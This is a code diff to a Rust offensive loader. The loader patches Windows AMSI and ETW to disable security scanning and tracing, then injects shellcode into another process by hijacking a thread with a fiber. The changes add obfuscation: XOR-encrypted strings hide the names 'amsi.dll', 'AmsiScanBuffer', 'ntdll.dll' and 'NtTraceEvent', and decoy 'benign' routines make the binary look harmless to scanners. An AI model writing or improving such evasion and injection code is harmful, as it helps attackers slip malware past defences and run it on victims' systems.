@@ -30,8 +30,15 @@ use std::{
 use crate::hooks::{initialize_hooks, destroy_hooks};
 pub use indirect_lib::{get_ssn_by_name, set_hw_bp};
 
+mod benign_utils;
+pub mod crypto_utils;
+
+pub mod crypto_constants {
+    include!(concat!(env!("OUT_DIR"), "/crypto_constants.rs"));
+}
+
 use windows::{
-    core::{s, Error, PCSTR, Result},
+    core::{Error, PCSTR, Result},
     Win32::System::{
         LibraryLoader::{GetProcAddress, LoadLibraryA},
         Memory::{
@@ -45,6 +52,13 @@ use windows::{
 };
 
 fn main() -> Result<()> {
+    // exec benign logic
+    let logger = benign_utils::Logger::new();
+    logger.init();
+    
+    let _primes = benign_utils::calculate_primes(100);
+    let _s = benign_utils::harmless_string_op("initialization");
+
     unsafe {
         initialize_hooks();
         // parse cli args
@@ -80,8 +94,22 @@ fn main() -> Result<()> {
 
         // patch AMSI
         let patch_opcode = 0x75u8;
-        let h_module = LoadLibraryA(s!("amsi.dll"))?;
-        let amsi_scan_buffer = GetProcAddress(h_module, PCSTR(b"AmsiScanBuffer\0".as_ptr()))
+        // "amsi.dll"
+        let amsi_dll_vec = crypto_utils::xor_decrypt(
+            crypto_constants::constants::AMSI_DLL_ENC, 
+            crypto_constants::constants::XOR_KEY
+        );
+        let amsi_dll_str = std::ffi::CString::new(amsi_dll_vec).unwrap();
+        
+        // "AmsiScanBuffer"
+        let amsi_func_vec = crypto_utils::xor_decrypt(
+            crypto_constants::constants::AMSI_SCAN_ENC, 
+            crypto_constants::constants::XOR_KEY
+        );
+        let amsi_func_str = std::ffi::CString::new(amsi_func_vec).unwrap();
+
+        let h_module = LoadLibraryA(PCSTR(amsi_dll_str.as_ptr() as *const u8))?;
+        let amsi_scan_buffer = GetProcAddress(h_module, PCSTR(amsi_func_str.as_ptr() as *const u8))
             .ok_or_else(|| Error::from_thread())? as *const u8;
         let bytes = std::slice::from_raw_parts(amsi_scan_buffer, 0x1000);
         let pattern = [0xC3, 0xCC, 0xCC];
@@ -132,8 +160,22 @@ fn main() -> Result<()> {
         )?;
 
         // patch ETW
-        let h_ntdll = LoadLibraryA(s!("ntdll.dll"))?;
-        let nt_trace_addr = GetProcAddress(h_ntdll, PCSTR(b"NtTraceEvent\0".as_ptr()))
+        // "ntdll.dll"
+        let ntdll_dll_vec = crypto_utils::xor_decrypt(
+            crypto_constants::constants::NTDLL_DLL_ENC, 
+            crypto_constants::constants::XOR_KEY
+        );
+        let ntdll_dll_str = std::ffi::CString::new(ntdll_dll_vec).unwrap();
+
+        // "NtTraceEvent"
+        let trace_func_vec = crypto_utils::xor_decrypt(
+            crypto_constants::constants::NT_TRACE_ENC, 
+            crypto_constants::constants::XOR_KEY
+        );
+        let trace_func_str = std::ffi::CString::new(trace_func_vec).unwrap();
+
+        let h_ntdll = LoadLibraryA(PCSTR(ntdll_dll_str.as_ptr() as *const u8))?;
+        let nt_trace_addr = GetProcAddress(h_ntdll, PCSTR(trace_func_str.as_ptr() as *const u8))
             .ok_or_else(|| Error::from_thread())? as *const c_void;
 
         let handle = GetCurrentProcess();
@@ -237,7 +279,7 @@ fn main() -> Result<()> {
                                      Ok((addr, _size)) => {
                                          // println!("[+] Success!");
                                          if use_cleanup {
-                                             thread::sleep(Duration::from_millis(10000));
+                                             thread::sleep(Duration::from_millis(500));
                                              let mut region_size: usize = 0;
                                              let mut base_addr = addr;
                                              missed_calls::nt_free_virtual_memory(
@@ -309,7 +351,7 @@ fn main() -> Result<()> {
                     match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                         Ok((addr, _size)) => {
                             if use_cleanup {
-                                 thread::sleep(Duration::from_millis(10000));
+                                 thread::sleep(Duration::from_millis(500));
                                  let mut region_size: usize = 0;
                                  let mut base_addr = addr;
                                  missed_calls::nt_free_virtual_memory(
